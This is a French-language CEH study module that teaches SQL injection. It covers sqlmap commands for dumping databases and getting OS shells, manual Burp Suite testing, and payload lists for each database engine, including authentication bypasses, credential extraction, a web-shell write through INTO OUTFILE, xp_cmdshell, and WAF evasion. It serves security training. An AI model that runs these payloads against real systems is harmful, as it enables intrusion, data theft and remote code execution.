# 🔴 Module 15 — Outils & Labs : SQL Injection

> **CEH v13 | EC-Council**  
> `#sqlmap` `#BurpSuite` `#ManualTesting` `#Payloads`

---

## 📌 Table des matières

1. [sqlmap — Guide complet](#1-sqlmap)
2. [Burp Suite — Tests manuels SQLi](#2-burp-suite)
3. [Payloads manuels organisés par SGBD](#3-payloads-manuels)
4. [Workflow de test SQLi complet](#4-workflow-complet)

---

## 1. sqlmap — Guide Complet

sqlmap est l'outil de référence pour la détection et l'exploitation automatisée des injections SQL.

```bash
# ─── DÉTECTION BASIQUE ─────────────────────────────────────────
sqlmap -u "http://target.com/product?id=1"

# ─── AVEC COOKIES (session authentifiée) ───────────────────────
sqlmap -u "http://target.com/profile?id=1" \
  --cookie="PHPSESSID=abc123; admin=1"

# ─── REQUÊTE POST ──────────────────────────────────────────────
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  -p username    # Tester uniquement le paramètre username

# ─── VIA BURP SUITE (fichier de requête) ──────────────────────
# Sauvegarder la requête depuis Burp Suite (Save item)
sqlmap -r burp_request.txt

# ─── LISTER LES BASES DE DONNÉES ──────────────────────────────
sqlmap -u "http://target.com/?id=1" --dbs

# ─── LISTER LES TABLES D'UNE DB ────────────────────────────────
sqlmap -u "http://target.com/?id=1" -D target_db --tables

# ─── LISTER LES COLONNES D'UNE TABLE ──────────────────────────
sqlmap -u "http://target.com/?id=1" -D target_db -T users --columns

# ─── EXTRAIRE LES DONNÉES ──────────────────────────────────────
sqlmap -u "http://target.com/?id=1" -D target_db -T users --dump

# ─── DUMP COMPLET ──────────────────────────────────────────────
sqlmap -u "http://target.com/?id=1" --dump-all

# ─── SHELL INTERACTIF ──────────────────────────────────────────
sqlmap -u "http://target.com/?id=1" --sql-shell  # Shell SQL
sqlmap -u "http://target.com/?id=1" --os-shell   # Shell OS (si possible)

# ─── BYPASS WAF ────────────────────────────────────────────────
sqlmap -u "http://target.com/?id=1" \
  --tamper=space2comment,randomcase \
  --delay=1 \
  --random-agent \
  --level=5 \
  --risk=3

# ─── OPTIONS IMPORTANTES ───────────────────────────────────────
--level=1-5      # Profondeur des tests (défaut=1, max=5)
--risk=1-3       # Agressivité (défaut=1, max=3)
--threads=5      # Requêtes parallèles
--technique=BUTS # B=Boolean, U=Union, T=Time, S=Stacked
--dbms=mysql     # Forcer le SGBD
--proxy=http://127.0.0.1:8080  # Passer par Burp Suite
--batch          # Pas de questions interactives
--smart          # Smart tests uniquement
```

---

## 2. Burp Suite — Tests Manuels SQLi

```
Workflow Burp Suite pour SQLi manuel :

1. Intercepter la requête avec le paramètre suspect
   GET /search?q=laptop HTTP/1.1
   Host: target.com

2. Envoyer au Repeater (Ctrl+R)

3. Tester avec '
   GET /search?q=laptop' HTTP/1.1
   → Erreur SQL visible → Vulnérable

4. Tester UNION SELECT
   Trouver le nombre de colonnes :
   GET /search?q=laptop' ORDER BY 1-- HTTP/1.1
   GET /search?q=laptop' ORDER BY 2-- HTTP/1.1
   ...jusqu'à l'erreur

5. Injection UNION
   GET /search?q=laptop' UNION SELECT 1,2,3-- HTTP/1.1
   → Quels chiffres s'affichent ?

6. Extraire les données
   GET /search?q=laptop' UNION SELECT username,password,3 FROM users-- HTTP/1.1

Configuration Burp Intruder pour fuzzing SQLi :
  Position : GET /search?q=§test§
  Payload type : Simple list
  Payload list : /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
  Grep Match : "SQL syntax", "error", "mysql"
```

---

## 3. Payloads Manuels Organisés par SGBD

### MySQL

```sql
-- Auth bypass :
' OR '1'='1
' OR 1=1 --
admin'--
' OR 'x'='x

-- Version :
' UNION SELECT @@version, 2 --
' AND 1=0 UNION SELECT version(), user() --

-- Databases :
' UNION SELECT schema_name, 2 FROM information_schema.schemata --

-- Tables :
' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database() --

-- Users :
' UNION SELECT user, password FROM mysql.user --

-- RCE (si FILE privilege) :
' UNION SELECT '<?php system($_GET["cmd"]); ?>', 2 INTO OUTFILE '/var/www/html/cmd.php' --
```

### Microsoft SQL Server (MSSQL)

```sql
-- Version :
' UNION SELECT @@version, 2 --

-- Databases :
' UNION SELECT name, 2 FROM master..sysdatabases --

-- Tables :
' UNION SELECT name, 2 FROM sysobjects WHERE xtype='U' --

-- RCE via xp_cmdshell :
'; EXEC xp_cmdshell 'whoami'; --

-- Stacked queries :
'; INSERT INTO users VALUES ('hacker', 'password123'); --
```

### Oracle

```sql
-- Version :
' UNION SELECT banner, 2 FROM v$version WHERE ROWNUM=1 --

-- Tables :
' UNION SELECT table_name, 2 FROM all_tables --

-- Note Oracle : toujours besoin de FROM dual pour SELECT :
' UNION SELECT 1, 2 FROM dual --
```

---

## 4. Workflow de Test SQLi Complet

```
Scénario : Application web de e-commerce avec paramètre vulnérable

Étape 1 : Identifier les points d'injection
  → Tous les paramètres GET/POST
  → Champs de formulaire, cookies, headers User-Agent

Étape 2 : Confirmer l'injection
  /product?id=1'       → Erreur SQL → Vulnérable !
  /product?id=1 AND 1=1→ Résultat normal
  /product?id=1 AND 1=2→ Pas de résultat → Confirmed !

Étape 3 : Identifier le type
  → Erreur SQL visible ? → Error-based
  → Données retournées ? → Union-based
  → Comportement différent ? → Blind Boolean
  → Délai avec SLEEP(5) ? → Time-based

Étape 4 : Automatiser avec sqlmap
  sqlmap -u "http://target.com/product?id=1" \
    --batch --level=3 --dbs

Étape 5 : Extraire les données
  sqlmap -u "http://target.com/product?id=1" \
    -D ecommerce -T users --dump

Étape 6 : Tenter escalade (si permissions)
  sqlmap -u "..." --os-shell
  → Tenter d'obtenir un shell OS via SQLi
```

---

## 🧠 Points clés à retenir pour l'examen

- **sqlmap** = outil officiel CEH pour SQLi automatisé
- `--dbs` → lister les bases ; `--tables` → lister les tables ; `--dump` → extraire
- `-r file.txt` → utiliser une requête capturée depuis Burp
- `--tamper` → scripts de bypass WAF (space2comment, randomcase)
- `--level` et `--risk` → contrôlent la profondeur et l'agressivité
- **Manual testing** = tester avec `'`, `' OR 1=1--`, `' ORDER BY N--`

---

*⬅️ [Techniques avancées](./03_techniques_avancees.md) | ➡️ [Contre-mesures](./05_contre-mesures.md)*
